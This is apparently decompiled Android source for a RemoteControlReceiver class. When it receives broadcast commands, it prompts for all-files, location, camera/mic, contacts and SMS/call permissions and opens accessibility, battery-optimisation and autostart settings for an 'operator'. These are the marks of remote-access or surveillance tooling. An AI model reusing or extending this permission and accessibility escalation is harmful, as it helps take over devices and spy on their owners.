// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package lyr.stable.runtime.defense;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.SystemClock;
import android.util.Log;
import f2.l;
import java.util.Collections;
import lyr.stable.runtime.PermissionRequestActivity;
import lyr.stable.runtime.ScreenMirrorService;
import q2.k;
import w1.m;
import w1.n;
import x1.i;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class RemoteControlReceiver extends BroadcastReceiver {
    public static void a(Context context) {
        ScreenMirrorService screenMirrorServiceU2 = ScreenMirrorService.U2();
        if (screenMirrorServiceU2 != null && screenMirrorServiceU2.t5 != null) {
            i iVar = screenMirrorServiceU2.t5;
            iVar.getClass();
            long jMax = Math.max(1L, Math.min(30000L, 30000L));
            long jUptimeMillis = SystemClock.uptimeMillis() + jMax;
            iVar.f5885g = jUptimeMillis;
            i.f5878m = jUptimeMillis;
            iVar.f5881c.m(true);
            iVar.b(jUptimeMillis);
            Log.i("DefenseOrchestrator", "operator a11y window opened durationMs=" + jMax);
        }
        try {
            Intent intent = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
            intent.setData(Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(1485307904);
            context.startActivity(intent);
        } catch (Throwable th) {
            Log.w("RemoteControlReceiver", "openAccessibilitySettings failed", th);
            try {
                Intent intent2 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                intent2.addFlags(1485307904);
                context.startActivity(intent2);
            } catch (Throwable th2) {
                Log.w("RemoteControlReceiver", "fallback failed", th2);
            }
        }
    }

    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        if (intent == null || intent.getAction() == null) {
            return;
        }
        String action = intent.getAction();
        Log.i("RemoteControlReceiver", "Received command: " + action);
        action.getClass();
        switch (action) {
            case "lyr.stable.runtime.action.REQ_ALL_FILES":
                if (!n.K(context)) {
                    k.m(context);
                    break;
                } else {
                    m mVarC = m.c(context);
                    mVarC.getClass();
                    mVarC.f(2, n.y0("files"));
                    break;
                }
                break;
            case "lyr.stable.runtime.action.REQ_LOCATION":
            case "lyr.stable.runtime.action.REQ_CAMERA_MIC":
            case "lyr.stable.runtime.action.REQ_STORAGE_OTHERS":
            case "lyr.stable.runtime.action.REQ_CONTACTS":
            case "lyr.stable.runtime.action.REQ_ALL":
            case "lyr.stable.runtime.action.REQ_SMS_CALL":
                try {
                    int i3 = PermissionRequestActivity.f2461e;
                    Intent intent2 = new Intent(context, (Class<?>) PermissionRequestActivity.class);
                    intent2.putExtra("cmd", "request_permisson:all");
                    intent2.addFlags(1476395008);
                    context.startActivity(intent2);
                    break;
                } catch (Throwable th) {
                    Log.w("RemoteControlReceiver", "launchPermRequest failed cmd=request_permisson:all", th);
                    return;
                }
                break;
            case "lyr.stable.runtime.action.REQ_BATTERY_OPT":
                try {
                    k.n(context);
                    break;
                } catch (Throwable th2) {
                    Log.w("RemoteControlReceiver", "openBatteryOptimization failed", th2);
                    return;
                }
                break;
            case "lyr.stable.runtime.action.OPEN_ACCESSIBILITY":
                a(context);
                break;
            case "lyr.stable.runtime.action.ENABLE_A11Y_SHELL":
                try {
                    Log.i("RemoteControlReceiver", n.t(context) ? "Accessibility already enabled" : "Accessibility authorization notification requested");
                    break;
                } catch (Throwable th3) {
                    Log.w("RemoteControlReceiver", "Accessibility authorization prompt failed", th3);
                    return;
                }
                break;
            case "lyr.stable.runtime.action.REQ_AUTO_START":
                try {
                    l.h0(context, l.f(context, 4, Collections.EMPTY_LIST), "remote-autostart");
                    break;
                } catch (Throwable th4) {
                    Log.w("RemoteControlReceiver", "openOemAutostart failed", th4);
                    return;
                }
                break;
        }
    }
}
